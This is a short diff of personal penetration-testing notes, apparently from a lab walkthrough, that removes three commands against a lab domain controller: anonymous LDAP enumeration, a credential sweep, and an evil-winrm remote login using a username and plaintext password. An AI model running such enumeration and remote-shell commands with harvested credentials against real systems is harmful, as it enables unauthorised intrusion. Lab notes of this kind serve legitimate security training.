@@ -1,15 +1,15 @@
 [[Editing Copy Page]]
 
 ```
-ldapsearch -v -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" -H "ldap://10.129.95.180" > ldapsearchoutput.txt
+
 ```
 
 ```
-cd ~/Desktop/Tools/Windows && ./nxc-sweep 10.129.95.180 -u 'fsmith' -p 'Thestrokes23'
+
 ```
 
 ```
-evil-winrm -i 10.129.95.180 -u 'fsmith' -p 'Thestrokes23'
+
 ```
 
 ```
